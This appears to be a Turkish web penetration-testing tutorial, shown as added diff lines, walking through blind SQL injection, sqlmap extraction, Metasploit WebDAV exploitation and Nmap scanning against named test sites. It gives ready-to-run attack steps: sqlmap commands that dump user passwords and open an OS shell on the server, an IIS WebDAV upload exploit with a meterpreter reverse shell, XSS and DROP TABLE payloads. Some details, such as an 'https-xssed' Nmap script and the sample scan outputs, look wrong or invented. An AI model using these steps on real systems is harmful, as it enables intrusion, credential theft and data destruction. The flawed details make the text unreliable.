+2. Adım: Veritabanı türünü belirleyin. Farklı veritabanları farklı SQL sözdizimleri ve fonksiyonları kullanır. Bu nedenle, saldırıyı gerçekleştirmek için veritabanı türünü bilmek önemlidir. Veritabanı türünü belirlemek için, parametreye farklı veritabanı fonksiyonları ekleyerek, web uygulamasının yanıtını gözlemleyin. Örneğin, MySQL veritabanı için VERSION() fonksiyonu, Microsoft SQL Server veritabanı için @@VERSION fonksiyonu kullanılabilir. Eğer web uygulaması hata mesajı döndürürse, bu fonksiyon veritabanı tarafından desteklenmiyordur. Eğer web uygulaması normal bir yanıt döndürürse, bu fonksiyon veritabanı tarafından destekleniyordur. Bu şekilde, veritabanı türünü tahmin etmeye çalışın.
+3. Adım: Veritabanından veri çekin. Veritabanı türünü belirledikten sonra, veritabanından istediğiniz veriyi çekmek için uygun SQL sorguları oluşturun. Bunun için, web uygulamasının yanıtına göre doğru veya yanlış olduğunu anlayabileceğiniz koşullar kullanın. Örneğin, veritabanındaki Users tablosundan, Username sütununun ilk karakterinin A olduğunu test etmek için, cat parametresine 1' AND SUBSTRING ( (SELECT Username FROM Users LIMIT 1), 1, 1) = 'A gibi bir değer verin. Eğer web uygulaması normal bir yanıt döndürürse, bu koşul doğrudur. Eğer web uygulaması hata mesajı döndürürse, bu koşul yanlıştır. Bu şekilde, veritabanındaki verileri tek tek tahmin etmeye çalışın.
+Bu adımları takip ederek, kör SQL injection saldırısı yapabilirsiniz. Ancak, bu saldırı çok zaman alıcı ve zahmetli olabilir. Bu nedenle, bu saldırıyı otomatikleştiren araçlar kullanmak daha etkili olabilir. Örneğin, sqlmap gibi bir araç, veritabanı türünü, tablo ve sütun isimlerini, veri değerlerini ve daha fazlasını otomatik olarak tespit edebilir.
+SQL injection saldırılarından korunmak için, web uygulamasının kodunu güvenli bir şekilde yazmak ve test etmek gerekir. Özellikle, SQL sorgularını oluştururken, kullanıcı girdilerini doğrudan birleştirmek yerine, parametreli sorgular veya hazır ifadeler kullanmak önemlidir. Ayrıca, web uygulamasının veritabanına erişimi için en az ayrıcalığa sahip bir kullanıcı hesabı oluşturmak ve veritabanı hatalarının ayrıntılarını kullanıcıya göstermemek de iyi uygulamalardır.
+Sqlmap Kullanarak SQLi hatalarında Veri Çekme
+Sqlmap, web uygulamalarında SQL Injection tespitini ve bulunan açıkların exploit edilmesini otomatik hale getiren açık kaynak kodlu bir araçtır. Sqlmap'te kullanılan parametrelerin neredeyse tamamı önemli işlevlere sahip parametrelerdir. Bu yazıda, sqlmap kullanarak SQLi hatalarında veri çekme işleminin adımlarını uygulama üzerinden detaylıca açıklayarak anlatacağım.
+Öncelikle, sqlmap aracını indirmek için şu bağlantıyı kullanabilirsiniz: https://github.com/sqlmapproject/sqlmap Ardından, sqlmap aracını çalıştırmak için terminalde sqlmap dizinine gidip python sqlmap.py komutunu yazabilirsiniz. Bu komut, sqlmap aracının kullanımı ve parametreleri hakkında kısa bir bilgi verir.
+Sqlmap aracını kullanarak SQLi hatalarında veri çekme işlemini şu adımlarla gerçekleştirebiliriz:
+1. Adım: SQL injection açıklığı olan bir URL bulma. Bu adımda, hedef web uygulamasının URL'sini sqlmap aracına tanıtmak için -u veya --url parametresini kullanırız. Örneğin, https://testasp.asaguvenlik.com/showforum.asp?id=0 URL'sinde SQL injection açıklığı olduğunu varsayalım. Bu durumda, sqlmap aracına şu komutu veririz:
+python sqlmap.py -u "https://testasp.asaguvenlik.com/showforum.asp?id=0"
+Bu komut sonucunda, eğer URL'de SQL injection zafiyeti mevcutsa, zafiyetin türü, hangi DBMS (Database Management System)’in kullanıldığı, web uygulama dili ve sunucu versiyonu gibi bazı bilgilere ulaşmamız mümkün olacaktır.
+2. Adım: Sqlmap ile bu açıklıktan faydalanarak varolan veritabanlarını (-dbs) ve mevcut kullanıcıyı (--current-user) bulalım. Bu adımda, SQL injection açıklığının var olduğunu öğrendiğimiz URL vasıtasıyla saldırıya --dbs parametresini ekleyerek mevcut veritabanlarının listesini ekrana getirebiliriz. Ayrıca, --current-user parametresi ile de veritabanına bağlı olan kullanıcı adını öğrenebiliriz. Bu durumda, sqlmap aracına şu komutu veririz:
+python sqlmap.py -u "https://testasp.asaguvenlik.com/showforum.asp?id=0" --dbs --current-user
+Bu komut sonucunda, ekrana mevcut veritabanlarının listesi ve kullanıcı adı yazılacaktır. Örneğin, veritabanlarının listesi şöyle olabilir:
+available databases [3]:
+[*] acublog
+[*] master
+[*] testsparker
+Ve kullanıcı adı şöyle olabilir:
+current user: 'sa'
+3. Adım: Acublog isimli veritabanındaki tabloları bulalım. Bu adımda, mevcut veritabanları arasından ilgilendiğimiz bir veritabanı adını -D parametresi ile belirtiriz. Örneğin, acublog veritabanını seçelim. Ardından, --tables parametresi ile de bu veritabanındaki tablo isimlerini getirmek için sqlmap aracına şu komutu veririz:
+python sqlmap.py -u "https://testasp.asaguvenlik.com/showforum.asp?id=0" -D acublog --tables
+Bu komut sonucunda, ekrana acublog veritabanındaki tablo isimleri yazılacaktır. Örneğin, tablo isimleri şöyle olabilir:
+Database: acublog
+[3 tables]
++---------+
+| posts   |
+| users   |
+| comments|
++---------+
+4. Adım: Dbo.users tablosundaki tüm sütun (kolon) isimlerini bulalım. Bu adımda, veritabanındaki tablo isimleri de alındıktan sonra kolonlarına ulaşılması istenen tablo adını -T parametresi ile belirtiriz. Örneğin, users tablosunu seçelim. Ardından, --columns parametresi ile de bu tablodaki kolon isimlerini getirmek için sqlmap aracına şu komutu veririz:
+python sqlmap.py -u "https://testasp.asaguvenlik.com/showforum.asp?id=0" -D acublog -T users --columns
+Bu komut sonucunda, ekrana users tablosundaki kolon isimleri yazılacaktır. Örneğin, kolon isimleri şöyle olabilir:
+Database: acublog
+Table: users
+[4 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| id     | int          |
+| uname  | varchar(50)  |
+| upass  | varchar(50)  |
+| role   | varchar(10)  |
++--------+--------------+
+5. Adım: Users tablosundaki uname ve upass kolonlarındaki mevcut veriyi çekelim. Bu adımda, tablodaki kolon isimleri de alındıktan sonra verilerine ulaşılması istenen kolon adlarını -C parametresi ile belirtiriz. Örneğin, uname ve upass kolonlarını seçelim. Ardından, --dump parametresi ile de bu kolonlarda yer alan verileri ekrana yansıtmak için sqlmap aracına şu komutu veririz:
+python sqlmap.py -u "https://testasp.asaguvenlik.com/showforum.asp?id=0" -D acublog -T users -C uname,upass --dump
+Bu komut sonucunda, ekrana users tablosundaki uname ve upass kolonlarındaki veriler yazılacaktır. Örneğin, veriler şöyle olabilir:
+Database: acublog
+Table: users
+[3 entries]
++----------+----------+
+| uname    | upass    |
++----------+----------+
+| admin    | 123456   |
+| guest    | guest123 |
+| user     | user123  |
++----------+----------+
+Bu şekilde, sqlmap aracını kullanarak SQLi hatalarında veri çekme işlemini tamamlamış oluruz. 
+Sqlmap Kullanarak İşletim Sistemini Ele Geçirme
+Sqlmap, web uygulamalarında SQL injection açıklarını tespit etmek ve istismar etmek için kullanılan açık kaynaklı bir araçtır. Sqlmap, hedef web uygulamasının kullandığı veritabanı yönetim sistemi (DBMS) üzerinde komut çalıştırmak için çeşitli yöntemler sunar. Bunlardan biri de --os-shell parametresidir. Bu parametre, sqlmap'in hedef sunucunun işletim sisteminde etkileşimli bir kabuk (shell) açmasını sağlar.
+--os-shell parametresini kullanmak için, öncelikle hedef web uygulamasında SQL injection açığı olduğundan emin olmalısınız. Ayrıca, hedef sunucunun işletim sistemi ve DBMS türünü bilmek de işinizi kolaylaştıracaktır. Sqlmap, bu bilgileri otomatik olarak tespit etmeye çalışır, ancak bazen manuel olarak belirtmeniz gerekebilir.
+Örneğin, hedef web uygulamasının URL'si http://testasp.asaguvenlik.com/showforum.asp?id=0 olsun. Bu URL'de id parametresinin SQL injection açığına sahip olduğunu varsayalım. Ayrıca, hedef sunucunun Windows işletim sistemi ve Microsoft SQL Server DBMS kullandığını da varsayalım. Bu durumda, --os-shell parametresini kullanmak için aşağıdaki komutu girebilirsiniz:
+root@pentest09:/pentest/database/sqlmap# python sqlmap.py -u "http://testasp.asaguvenlik.com/showforum.asp?id=0" --os-shell --os=windows --dbms=mssql
+Bu komut, sqlmap'in hedef URL'yi tarayarak SQL injection açığını tespit etmesini, ardından hedef sunucunun işletim sistemi ve DBMS türünü doğrulamasını sağlar. Eğer sqlmap, hedef sunucunun işletim sisteminde komut çalıştırabileceği bir yöntem bulursa, size bir kabuk açmak için onay sorar. Onay verdiğiniz takdirde, sqlmap hedef sunucuda bir kabuk dosyası oluşturur ve bunu çalıştırarak size etkileşimli bir kabuk sunar.
+Etkileşimli kabukta, hedef sunucunun işletim sisteminde istediğiniz komutları çalıştırabilirsiniz. Örneğin, hedef sunucunun IP adresini öğrenmek için ipconfig komutunu girebilirsiniz. Hedef sunucunun dosya sistemini gezinmek için cd, dir, copy, del gibi komutları kullanabilirsiniz. Hedef sunucunun işletim sistemi ve DBMS bilgilerini öğrenmek için systeminfo, sqlcmd gibi komutları kullanabilirsiniz. Hedef sunucudan ayrılmak için exit komutunu girebilirsiniz.
+Flash Dosyalarındaki Güvenlik Zafiyetlerini Belirleme
+Flash dosyaları, Adobe Flash Player'da çalıştırılan dinamik ve multimedya içerikli dosyalardır. Flash dosyaları, web sitelerinde reklam, video akışı veya oyun gibi amaçlarla kullanılabilir. Ancak Flash dosyaları, birçok güvenlik sorununa da neden olabilir. Flash dosyaları, uzaktan kod çalıştırma, XSS, CSRF, dosya yükleme, bilgi sızdırma gibi saldırılara açık olabilir. Bu nedenle, Flash dosyalarını güvenlik açısından analiz etmek önemlidir.
+Flash dosyalarını analiz etmek için kullanabileceğiniz bazı araçlar şunlardır:
+- SWFIntruder: SWFIntruder, Flash dosyalarını tarayıcı bağlamında test etmek için geliştirilmiş bir araçtır. Flash dosyalarını farklı girdilerle yükleyerek XSS, CSRF ve diğer güvenlik sorunlarını tespit edebilir. SWFIntruder, ActionScript 2 ve ActionScript 3 kodunu decompile edebilir. SWFIntruder, https://github.com/irsdl/updated-SWFIntruder adresinden indirilebilir. SWFIntruder'ın güncel versiyonu 0.9.1'dir. SWFIntruder'ı kullanmak için aşağıdaki adımları izleyebilirsiniz:
+    1. SWFIntruder'ı indirin ve /var/www/ dizinine kopyalayın.
+    2. Apache web sunucusunu başlatın.
+    3. Tarayıcınızda http://localhost/swfintruder/index.html adresine gidin.
+    4. Analiz etmek istediğiniz Flash dosyasının URL'sini veya yerel dosya yolunu girin ve Get butonuna tıklayın.
+    5. SWFIntruder, Flash dosyasını yükleyecek ve güvenlik sorunlarını raporlayacaktır.
+- SWFScan: SWFScan, HP tarafından geliştirilmiş ücretsiz bir Flash güvenlik aracıdır. SWFScan, ActionScript 2 ve ActionScript 3 kodunu decompile edebilir ve güvenlik zafiyetlerini analiz edebilir.  SWFScan'ın son versiyonu 1.0'dır. SWFScan'ı kullanmak için aşağıdaki adımları izleyebilirsiniz:
+    1. SWFScan'ı indirin ve kurun.
+    2. SWFScan'ı çalıştırın ve File menüsünden Open SWF File seçeneğini seçin.
+    3. Analiz etmek istediğiniz Flash dosyasını seçin ve Open butonuna tıklayın.
+    4. SWFScan, Flash dosyasını decompile edecek ve güvenlik sorunlarını raporlayacaktır.
+Bu araçlar, Flash dosyalarının güvenliğini artırmak için yararlı olabilir. Ancak, Flash dosyalarının güvenliğini sağlamak için Adobe'nin güvenlik en iyi uygulamalarını da takip etmeniz gerekir. Ayrıca, Flash dosyalarınızı düzenli olarak güncellemeniz ve güvenilir kaynaklardan indirmeniz önemlidir. 
+HTTP Metodları ve Güvenlik Zafiyetleri (HTTP PUT, WebDav)
+HTTP PUT ve DELETE metodları, web sunucularında yetkili kullanıcıların uzaktan içerik eklemelerine ve yönetmelerine olanak sağlayan endüstri standartı bir HTTP uzantısı olan WebDAV ile ilişkilidir. Bu metodlar, web sunucunun kötü yapılandırılması durumunda açık kalabilir ve saldırganların hedef sunucuya zararlı dosyalar göndermesine veya silmesine izin verebilir. Bu nedenle, bu metodların kullanımı ve güvenliği dikkatli bir şekilde kontrol edilmelidir.
+Metasploit, web sunucularında WebDAV'ın etkin olup olmadığını ve hangi metodların desteklendiğini tespit etmek için kullanılabilecek bir araçtır. Metasploit'in en son sürümü 6.1.2'dir. Metasploit'i kullanarak WebDAV zafiyetlerini test etmek için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Metasploit konsolunu açın ve use auxiliary/scanner/http/http_put komutunu girin. Bu modül, HTTP PUT metodunu kullanarak hedef sunucuya dosya göndermeyi deneyecektir. Eğer başarılı olursa, dosyanın URL'sini ve MD5 hash'ini döndürecektir.
+2. Adım: Modülün parametrelerini ayarlayın. RHOSTS parametresi için bir hedef subnet veya IP adresi belirtin. RPORT parametresi için hedef sunucunun portunu belirtin. Varsayılan olarak 80'dir. FILENAME parametresi için göndermek istediğiniz dosyanın adını belirtin. Varsayılan olarak msf_http_put_test.txt'dir. FILEDATA parametresi için dosyanın içeriğini belirtin. Varsayılan olarak Hello World!'dur. SSL parametresi için hedef sunucunun SSL kullanıp kullanmadığını belirtin. Varsayılan olarak false'tur. VERBOSE parametresi için modülün daha fazla ayrıntı vermesini isteyip istemediğinizi belirtin. Varsayılan olarak true'tur.
+3. Adım: Modülü çalıştırın. run veya exploit komutunu girin. Modül, hedef sunucuya dosya göndermeye çalışacak ve sonucu ekrana yazdıracaktır. Eğer başarılı olursa, dosyanın URL'sini ve MD5 hash'ini göreceksiniz. Eğer başarısız olursa, hata mesajını göreceksiniz.
+4. Adım: HTTP DELETE metodunu test etmek için, modülün ACTIONS parametresini DELETE olarak değiştirin. Ayrıca, silmek istediğiniz dosyanın adını FILENAME parametresine girin. Modülü tekrar çalıştırın. Modül, hedef sunucudan dosyayı silmeye çalışacak ve sonucu ekrana yazdıracaktır. Eğer başarılı olursa, silinen dosyanın URL'sini ve MD5 hash'ini göreceksiniz. Eğer başarısız olursa, hata mesajını göreceksiniz.
+Hedef sunucuda IIS webdav kurulu ise ve PUT metod açık ise, aşağıdaki exploit bunun için kullanılabilir:
+- exploit/windows/iis/iis_webdav_upload_asp: Bu exploit, WebDAV üzerinden bir ASP dosyası yükleyerek hedef sunucuda kod çalıştırmayı sağlar. Bu exploit'in parametreleri şunlardır:
+    - RHOSTS: Hedef sunucunun IP adresi veya subneti.
+    - RPORT: Hedef sunucunun portu. Varsayılan olarak 80'dir.
+    - PATH: WebDAV'ın etkin olduğu dizin. Varsayılan olarak /'dir.
+    - FILENAME: Yüklemek istediğiniz ASP dosyasının adı. Varsayılan olarak test.asp'dir.
+    - PAYLOAD: Kullanmak istediğiniz payload. Varsayılan olarak windows/meterpreter/reverse_tcp'dir.
+    - LHOST: Saldırganın IP adresi.
+    - LPORT: Saldırganın portu. Varsayılan olarak 4444'tür.
+    - SSL: Hedef sunucunun SSL kullanıp kullanmadığı. Varsayılan olarak false'tur.
+    - VERBOSE: Exploit'in daha fazla ayrıntı vermesini isteyip istemediğiniz. Varsayılan olarak true'tur.
+Bu exploit'i çalıştırmak için, önce use exploit/windows/iis/iis_webdav_upload_asp komutunu girin, sonra parametreleri ayarlayın ve son olarak run veya exploit komutunu girin. Exploit, hedef sunucuya ASP dosyasını yükleyecek ve payload'ı çalıştıracaktır. Eğer başarılı olursa, hedef sunucu ile bir meterpreter oturumu açılacaktır. Eğer başarısız olursa, hata mesajını göreceksiniz.
+Firefox HTTP Tamper Data Eklentisi Kullanma
+Firefox Tamper Data eklentisi, web siteleriyle olan iletişiminizi izlemenize, durdurmanıza ve değiştirmenize olanak tanıyan bir araçtır. Bu sayede web sitelerinin güvenlik açıklarını tespit edebilir, test edebilir ve istismar edebilirsiniz. Bu eklentiyi kullanmak için aşağıdaki adımları takip edebilirsiniz:
+1. Adım: Firefox Tamper Data eklentisini buradan https://addons.mozilla.org/tr/firefox/addon/tamper-data-for-ff-quantum/ indirin ve kurun. Firefox'unuzun sağ üst köşesinde bir bulut simgesi belirecektir.
+2. Adım: Tamper Data eklentisini çalıştırmak için bulut simgesine tıklayın. Start Tamper butonuna basarak tamper işlemini başlatın. Bir Tamper Data penceresi açılacaktır.
+3. Adım: Tamper Data eklentisi, web siteleriyle yaptığınız tüm HTTP isteklerini ve yanıtlarını yakalamaya başlayacaktır. Bu istekleri ve yanıtları Tamper Data penceresinde görebilirsiniz. Tamper etmek istediğiniz bir isteği seçin ve Tamper butonuna tıklayın. Örneğin, bir web sitesine giriş yapmak için kullanıcı adı ve şifre girin.
+4. Adım: Tamper Data eklentisi, seçtiğiniz isteği durduracak ve size isteğin başlıklarını, parametrelerini ve içeriğini değiştirme imkanı sunacaktır. Bu sayede isteği manipüle edebilirsiniz. Örneğin, kullanıcı adı veya şifre parametrelerini değiştirebilirsiniz.
+5. Adım: İsteği değiştirdikten sonra OK butonuna tıklayın. Tamper Data eklentisi, değiştirilmiş isteği sunucuya gönderecektir. Sunucunun verdiği yanıtı Tamper Data penceresinde veya web sayfasında görebilirsiniz.
+6. Adım: Tamper Data eklentisi ile web sitelerinin güvenlik açıklarını bulabilir ve istismar edebilirsiniz. Örneğin, bir web sitesinin SQL injection açığı olup olmadığını test edebilirsiniz. Bunun için, kullanıcı adı veya şifre parametresine admin' and '1'='1'-- gibi bir ifade girerek, sunucunun veritabanına zararlı bir sorgu göndermesini sağlayabilirsiniz. Eğer web sitesi, bu ifadeyi kabul ederse, SQL injection açığı olduğunu anlayabilirsiniz.
+7. Adım: Tamper işlemini durdurmak için, bulut simgesine tekrar tıklayın. Stop Tamper butonuna basarak tamper işlemini sonlandırın. Tamper Data penceresini kapatabilirsiniz.
+Firefox HTTP Header Live Eklentisi Kullanarak Veri Manipulasyonu
+HTTP Header Live eklentisi, web uygulamalarının gönderdiği ve aldığı HTTP istek ve yanıtlarını görüntülemenizi ve değiştirmenizi sağlayan bir araçtır. Bu eklenti, web uygulamalarındaki güvenlik zafiyetlerini tespit etmek ve test etmek için kullanılabilir. Web uygulamalarındaki güvenlik zafiyetleri, saldırganların uygulamanın işlevselliğini bozmasına, veri tabanına erişmesine veya kullanıcıların bilgilerini çalmasına neden olabilecek kod veya tasarım hatalarıdır.
+HTTP Header Live eklentisini kullanmak için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Firefox tarayıcınızda, eklenti sayfasına gidin ve Firefox'a Ekle butonuna tıklayın. Eklentiyi kurmak için izin verin. Eklenti, tarayıcınızın sağ üst köşesinde bir simge olarak görünecektir. Bu simgeye tıklayarak eklentiyi açabilirsiniz.
+2. Adım: Test etmek istediğiniz web uygulamasının adresini tarayıcınıza girin. Örneğin, testphp.vulnweb.com adresindeki bir web uygulamasını test edelim. Bu web uygulaması, bilerek güvenlik zafiyetleri içeren bir test ortamıdır. Bu web uygulamasında, Search isimli bir parametre ile arama yapabilirsiniz. Örneğin, Rıdvan kelimesini aratın. Bu arama işlemi sırasında, eklenti simgesine tıklayarak HTTP istek ve yanıtlarını görebilirsiniz. Bu istek ve yanıtlar, web uygulamasının nasıl çalıştığını ve hangi verileri kullandığını gösterir.
+3. Adım: HTTP istek ve yanıtlarını değiştirmek için, eklenti penceresinde Replay sekmesine geçin. Bu sekmede, istediğiniz bir HTTP isteğini seçebilir ve Edit butonuna tıklayarak isteğin içeriğini değiştirebilirsiniz. Örneğin, Search parametresinin değerini değiştirerek farklı bir arama yapabilirsiniz. Değişiklikleri yaptıktan sonra, Replay butonuna tıklayarak isteği tekrar gönderebilirsiniz. Bu şekilde, web uygulamasının değiştirilmiş isteğe nasıl tepki verdiğini görebilirsiniz.
+4. Adım: Web uygulamasındaki güvenlik zafiyetlerini test etmek için, HTTP isteklerine zararlı kodlar veya komutlar ekleyebilirsiniz. Bu kodlar veya komutlar, web uygulamasının normalden farklı davranmasına veya hata vermesine neden olabilir. Örneğin, Search parametresine XSS (Cross site Scripting) saldırısı yapmak için, <script>alert('test xss');</script> gibi bir kod ekleyebilirsiniz. Bu kod, web uygulamasının arama sonuçlarını gösterirken, ekranda bir uyarı mesajı çıkarmasına neden olur. Bu, web uygulamasının girdiği verileri doğru şekilde filtrelemediğini ve saldırganların kullanıcıların tarayıcılarında istedikleri kodu çalıştırabileceğini gösterir.
+5. Adım: HTTP isteklerine eklediğiniz zararlı kodlar veya komutlar, web uygulamasının veri tabanına erişmenize veya veri tabanındaki verileri değiştirmenize de olanak sağlayabilir. Bu tür saldırılara SQL enjeksiyonu denir. Örneğin, Search parametresine '; DROP TABLE users; -- gibi bir komut ekleyebilirsiniz. Bu komut, web uygulamasının veri tabanındaki users isimli tabloyu silmesine neden olur. Bu, web uygulamasının veri tabanı ile iletişim kurarken kullandığı SQL sorgularının güvenli olmadığını ve saldırganların veri tabanını manipüle edebileceğini gösterir.
+Bu şekilde, HTTP Header Live eklentisi kullanarak web uygulamalarındaki güvenlik zafiyetlerini tespit etmek ve test etmek mümkündür. Ancak, bu eklenti sadece HTTP istek ve yanıtlarını değiştirmenize izin verir. Web uygulamalarındaki diğer güvenlik zafiyetlerini tespit etmek için farklı araçlar veya yöntemler kullanmanız gerekebilir.
+Nmap Kullanarak HTTP Protokolünde Veri Manipulasyonu
+ Nmap, ağdaki cihazları ve servisleri keşfetmek için paket gönderip yanıtları analiz eden bir ağ tarayıcısıdır. Nmap, port taraması, işletim sistemi tespiti, versiyon tespiti ve zafiyet tespiti gibi birçok özelliğe sahiptir. Nmap, Linux, Windows, macOS ve BSD gibi farklı işletim sistemlerinde çalışabilir. Nmap'in resmi web sitesi nmap.org adresindedir.
+Nmap kullanmak için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Nmap'i kurmak için, nmap.org adresinden indirin ve kurulum talimatlarını takip edin. Nmap'i komut satırından veya Zenmap adlı grafiksel kullanıcı arayüzünden çalıştırabilirsiniz.
+2. Adım: Test etmek istediğiniz web uygulamasının IP adresini veya alan adını belirleyin. Örneğin, testphp.vulnweb.com adresindeki web uygulamasını test edelim. Bu web uygulamasının IP adresi 176.28.50.165'tir.
+3. Adım: Web uygulamasının hangi portlarda hangi servisleri çalıştırdığını tespit etmek için, Nmap ile port taraması yapın. Örneğin, aşağıdaki komutu kullanarak web uygulamasının 1000 adet iyi bilinen portunu tarayabilirsiniz:
+nmap testphp.vulnweb.com
+Bu komut, web uygulamasının 80, 443 ve 8080 numaralı portlarda HTTP servisini çalıştırdığını gösterecektir. Ayrıca, web uygulamasının 22 numaralı portta SSH servisini çalıştırdığını da görebilirsiniz.
+4. Adım: Web uygulamasının çalıştırdığı servislerin versiyonlarını ve işletim sistemini tespit etmek için, Nmap ile versiyon tespiti ve işletim sistemi tespiti yapın. Örneğin, aşağıdaki komutu kullanarak web uygulamasının servislerinin versiyonlarını ve işletim sistemini öğrenebilirsiniz:
+nmap -sV -O testphp.vulnweb.com
+Bu komut, web uygulamasının Apache 2.4.10, OpenSSL 1.0.1t, PHP 5.6.30-0+deb8u1 gibi servislerin versiyonlarını gösterecektir. Ayrıca, web uygulamasının Linux 3.2 - 4.9 işletim sistemi kullandığını da gösterecektir.
+5. Adım: Web uygulamasındaki güvenlik zafiyetlerini tespit etmek için, Nmap ile zafiyet tespiti yapın. Nmap, Nmap Scripting Engine (NSE) adlı bir betik motoru ile birlikte gelir. NSE, Lua programlama dili ile yazılmış betikleri çalıştırarak Nmap'in işlevselliğini genişletir. NSE, web uygulamalarındaki çeşitli güvenlik zafiyetlerini tespit etmek için kullanılabilir. Örneğin, aşağıdaki komutu kullanarak web uygulamasındaki XSS zafiyetlerini tespit edebilirsiniz:
+nmap --script http-xssed testphp.vulnweb.com
+Bu komut, web uygulamasının XSS zafiyetlerine sahip olduğunu ve bu zafiyetlerin xssed.com adlı bir web sitesinde kayıtlı olduğunu gösterecektir.
+Bu şekilde, Nmap kullanarak web uygulamalarındaki güvenlik zafiyetlerini tespit etmek ve test etmek mümkündür. Nmap, web uygulamalarının HTTP istek ve yanıtlarını değiştirmenize izin vermez, ancak web uygulamalarının ağ katmanındaki davranışlarını analiz eder. Web uygulamalarındaki diğer güvenlik zafiyetlerini tespit etmek için farklı araçlar veya yöntemler kullanmanız gerekebilir.
+Nmap Kullanarak HTTPS Protokolünde Veri Manipulasyonu
+ Nmap, ağ tarama ve zafiyet tespiti için kullanılan açık kaynaklı bir araçtır. Nmap ile ağdaki cihazları ve servisleri keşfedebilir, port taraması, işletim sistemi tespiti, versiyon tespiti ve zafiyet tespiti gibi işlemler yapabilirsiniz. Nmap, Linux, Windows, macOS ve BSD gibi farklı işletim sistemlerinde çalışabilir. Nmap'in resmi web sitesi nmap.org adresindedir.
+Nmap kullanmak için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Nmap'i kurmak için, nmap.org adresinden indirin ve kurulum talimatlarını takip edin. Nmap'i komut satırından veya Zenmap adlı grafiksel kullanıcı arayüzünden çalıştırabilirsiniz. Zenmap, nmap'den daha bütünlük içinde verileri sunan bir arayüzdür.
+2. Adım: Test etmek istediğiniz web uygulamasının IP adresini veya alan adını belirleyin. Örneğin, testphp.vulnweb.com adresindeki web uygulamasını test edelim. Bu web uygulamasının IP adresi 176.28.50.165'tir.
+3. Adım: Web uygulamasının hangi portlarda hangi servisleri çalıştırdığını tespit etmek için, Nmap ile port taraması yapın. Örneğin, aşağıdaki komutu kullanarak web uygulamasının 1000 adet iyi bilinen portunu tarayabilirsiniz:
+nmap testphp.vulnweb.com
+Bu komut, web uygulamasının 80, 443 ve 8080 numaralı portlarda HTTPS servisini çalıştırdığını gösterecektir. Ayrıca, web uygulamasının 22 numaralı portta SSH servisini çalıştırdığını da görebilirsiniz. Port taraması yaparken, TCP, UDP, SYN, ACK, FIN, NULL gibi farklı tarama teknikleri kullanabilirsiniz. Port taraması sonucunda, portların açık, kapalı, filtreli, filtresiz, açık-filtreli veya kapalı-filtreli olduğunu görebilirsiniz.
+4. Adım: Web uygulamasının çalıştırdığı servislerin versiyonlarını ve işletim sistemini tespit etmek için, Nmap ile versiyon tespiti ve işletim sistemi tespiti yapın. Örneğin, aşağıdaki komutu kullanarak web uygulamasının servislerinin versiyonlarını ve işletim sistemini öğrenebilirsiniz:
+nmap -sV -O testphp.vulnweb.com
+Bu komut, web uygulamasının Apache 2.4.10, OpenSSL 1.0.1t, PHP 5.6.30-0+deb8u1 gibi servislerin versiyonlarını gösterecektir.  Ayrıca, web uygulamasının Linux 3.2 - 4.9 işletim sistemi kullandığını da gösterecektir.
+5. Adım: Web uygulamasındaki güvenlik zafiyetlerini tespit etmek için, Nmap ile zafiyet tespiti yapın. Nmap, Nmap Scripting Engine (NSE) adlı bir betik motoru ile birlikte gelir. NSE, Lua programlama dili ile yazılmış betikleri çalıştırarak Nmap'in işlevselliğini genişletir. NSE, web uygulamalarındaki çeşitli güvenlik zafiyetlerini tespit etmek için kullanılabilir. Örneğin, aşağıdaki komutu kullanarak web uygulamasındaki XSS zafiyetlerini tespit edebilirsiniz:
+nmap --script https-xssed testphp.vulnweb.com
+Bu komut, web uygulamasının XSS zafiyetlerine sahip olduğunu ve bu zafiyetlerin xssed.com adlı bir web sitesinde kayıtlı olduğunu gösterecektir.
+Bu şekilde, Nmap kullanarak web uygulamalarındaki güvenlik zafiyetlerini tespit etmek ve test etmek mümkündür.
+Metasploit Kullanarak Veri Manipulasyonu
+Metasploit, güvenlik zafiyetlerini bulmak ve istismar etmek için kullanılan açık kaynaklı bir araçtır. Metasploit, Nmap gibi ağ tarama ve zafiyet tespiti yapabilir, ancak ayrıca zafiyetleri istismar edebilir ve hedef sistemlere sızabilir. Metasploit, modüller, istismarlar ve araçlar içeren güçlü ve esnek bir çerçevedir. Metasploit, Linux, Windows, macOS ve BSD gibi farklı işletim sistemlerinde çalışabilir. Metasploit'in resmi web sitesi metasploit.com adresindedir.
+Metasploit kullanmak için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Metasploit'i kurmak için, metasploit.com adresinden indirin ve kurulum talimatlarını takip edin. Metasploit'i komut satırından veya Armitage adlı grafiksel kullanıcı arayüzünden çalıştırabilirsiniz. Armitage, Metasploit'in işlevselliğini görsel olarak sunan bir arayüzdür.
+2. Adım: Test etmek istediğiniz web uygulamasının IP adresini veya alan adını belirleyin. Örneğin, testphp.vulnweb.com adresindeki web uygulamasını test edelim. Bu web uygulamasının IP adresi 176.28.50.165'tir.
+3. Adım: Web uygulamasının hangi portlarda hangi servisleri çalıştırdığını tespit etmek için, Metasploit ile port taraması yapın. Örneğin, aşağıdaki komutu kullanarak web uygulamasının 1000 adet iyi bilinen portunu tarayabilirsiniz:
+msfconsole
+use auxiliary/scanner/portscan/syn
+set RHOSTS testphp.vulnweb.com
+run
+Bu komut, web uygulamasının 80, 443 ve 8080 numaralı portlarda HTTPS servisini çalıştırdığını gösterecektir. Ayrıca, web uygulamasının 22 numaralı portta SSH servisini çalıştırdığını da görebilirsiniz. Port taraması yaparken, TCP, UDP, SYN, ACK, FIN, NULL gibi farklı tarama teknikleri kullanabilirsiniz. Port taraması sonucunda, portların açık, kapalı, filtreli, filtresiz, açık-filtreli veya kapalı-filtreli olduğunu görebilirsiniz.
+4. Adım: Web uygulamasının çalıştırdığı servislerin versiyonlarını ve işletim sistemini tespit etmek için, Metasploit ile versiyon tespiti ve işletim sistemi tespiti yapın. Örneğin, aşağıdaki komutu kullanarak web uygulamasının servislerinin versiyonlarını ve işletim sistemini öğrenebilirsiniz:
+msfconsole
+use auxiliary/scanner/http/http_version
+set RHOSTS testphp.vulnweb.com
+run
+Bu komut, web uygulamasının Apache 2.4.10, OpenSSL 1.0.1t, PHP 5.6.30-0+deb8u1 gibi servislerin versiyonlarını gösterecektir. Ayrıca, web uygulamasının Linux 3.2 - 4.9 işletim sistemi kullandığını da gösterecektir.
